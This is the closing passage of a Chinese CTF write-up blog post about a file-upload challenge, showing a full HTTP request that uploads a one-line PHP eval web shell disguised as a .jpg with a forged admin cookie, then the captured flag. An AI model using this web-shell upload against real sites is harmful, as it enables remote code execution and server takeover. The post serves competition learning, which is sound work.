+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/web/index.php?r=upload%2Fupload</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>114.55.36.69:8014</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>332</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://114.55.36.69:8014</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">DNT</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundaryUAu1gUcre21NULzR</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://114.55.36.69:8014/web/index.php?r=upload%2Findex</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en,zh-CN;q=0.9,zh;q=0.8</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>_csrf=ZrheCWNLhMGJ84x9lHiPaGGspHQBAJU_; _csrf_name_7ace9e0d=d13170c019575cfa3f28e142a6c066ad; _csrf_name_7ace9e0d__ckMd5=1725411428d3c49a; cib=%61%3a%33%3a%7b%73%3a%32%3a%22%69%64%22%3b%69%3a%31%3b%73%3a%34%3a%22%6e%61%6d%65%22%3b%73%3a%35%3a%22%61%64%6d%69%6e%22%3b%73%3a%34%3a%22%73%69%67%6e%22%3b%73%3a%33%32%3a%22%36%63%35%64%65%31%62%35%31%30%65%38%62%64%64%30%62%63%34%30%65%66%66%39%39%64%63%64%30%33%66%38%22%3b%7d; PHPSESSID=mq4vqc5002uti92f8t4gknh9l6</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-php">------WebKitFormBoundaryUAu1gUcre21NULzR</span></span><br><span class="line"><span class="language-php">Content-Disposition: form-data; name=<span class="string">&quot;upload_file&quot;</span>; filename=<span class="string">&quot;south.php.jpg&quot;</span></span></span><br><span class="line"><span class="language-php">Content-Type: text/php</span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="language-php">    @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;south&#x27;</span>]);</span></span><br><span class="line"><span class="language-php">    <span class="meta">?&gt;</span></span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php">------WebKitFormBoundaryUAu1gUcre21NULzR</span></span><br><span class="line"><span class="language-php">Content-Disposition: form-data; name=<span class="string">&quot;submit&quot;</span></span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php">ä¸ä¼ </span></span><br><span class="line"><span class="language-php">------WebKitFormBoundaryUAu1gUcre21NULzR--</span></span><br></pre></td></tr></table></figure>
+<p>最后连马得到<strong>flag{e0662bb5114da4e42b4185ed12dee2f3}</strong>。</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E5%AE%89%E6%81%92/" rel="tag"><i class="fa fa-tag"></i> 安恒</a>
+              <a href="/tags/Web/" rel="tag"><i class="fa fa-tag"></i> Web</a>
+              <a href="/tags/CTF/" rel="tag"><i class="fa fa-tag"></i> CTF</a>
+              <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" rel="tag"><i class="fa fa-tag"></i> 文件上传</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2018-AH-Autumn-Preliminary/" rel="prev" title="2018 全国大学生软件测试大赛 安恒杯Web测试大赛 预选赛 部分题解">
+                  <i class="fa fa-chevron-left"></i> 2018 全国大学生软件测试大赛 安恒杯Web测试大赛 预选赛 部分题解
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/Study-Unserialize-PHP/" rel="next" title="关于反序列化漏洞的初探">
+                  关于反序列化漏洞的初探 <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+    
+  <div class="comments disqusjs-container">
+    <noscript>Please enable JavaScript to view the comments powered by Disqus.</noscript>
+  </div>
+  
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  <script src="https://cdn.bootcdn.net/ajax/libs/jquery/3.6.4/jquery.min.js"></script>
+  <script src="/live2d-widget/autoload.js"></script>
+  &copy; 2018 – 
+  <span itemprop="copyrightYear">2025</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">南溟NaN</span>
+</div>
+<div class="busuanzi-count">
+    <span class="post-meta-item" id="busuanzi_container_site_uv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+    </div>
+  </footer>
+
+  
+  <div class="reading-progress-bar"></div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+
+
+
+  
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+  
+
+  <script class="next-config" data-name="enableMath" type="application/json">true</script><script class="next-config" data-name="mathjax" type="application/json">{"enable":true,"tags":"none","js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mathjax/3.2.2/es5/tex-mml-chtml.js","integrity":"sha256-MASABpB4tYktI2Oitl4t+78w/lyA+D7b/s9GEP0JOGI="}}</script>
+<script src="/js/third-party/math/mathjax.js"></script>
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/disqusjs/3.0.2/styles/disqusjs.css" integrity="sha256-71XarXwNr1Td27HmZI9zjY+rMzRdush6/glo6VFXp7o=" crossorigin="anonymous">
+
+<script class="next-config" data-name="disqusjs" type="application/json">{"enable":true,"api":"https://disqus.skk.moe/disqus/","apikey":"Cz7uQCDoGwWYGv80HeDq40mZr1rrmYy9tHhCpcWG95DFzOD1TJKLXtbTxFqWBCr5","shortname":"southseast","js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/disqusjs/3.0.2/disqusjs.es2015.umd.min.js","integrity":"sha256-okP99ZQKVpIy7+NogAMpGlIQzJa9XKXhIJcFgdju5bU="}}</script>
+<script src="/js/third-party/comments/disqusjs.js"></script>
+
+</body>
+</html>
